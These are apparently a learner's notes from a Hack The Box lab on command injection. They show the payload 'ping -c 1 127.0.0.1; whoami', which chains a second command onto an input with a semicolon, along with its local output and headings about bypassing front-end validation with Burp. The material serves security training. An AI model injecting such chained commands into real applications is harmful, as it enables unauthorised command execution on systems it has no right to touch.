## Injecting Our Command

```bash
ping -c 1 127.0.0.1; whoami
```

```shell
21y4d@htb[/htb]$ ping -c 1 127.0.0.1; whoami 

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms 

--- 127.0.0.1 ping statistics --- 
1 packets transmitted, 1 received, 0% packet loss, time 0ms 
rtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms 
21y4d
```
![](Pasted%20image%2020260717135655.png)
![](Pasted%20image%2020260717135716.png)
## Bypassing Front-End Validation
#### Burp POST Request
![](Pasted%20image%2020260717135742.png)
![](Pasted%20image%2020260717135752.png)
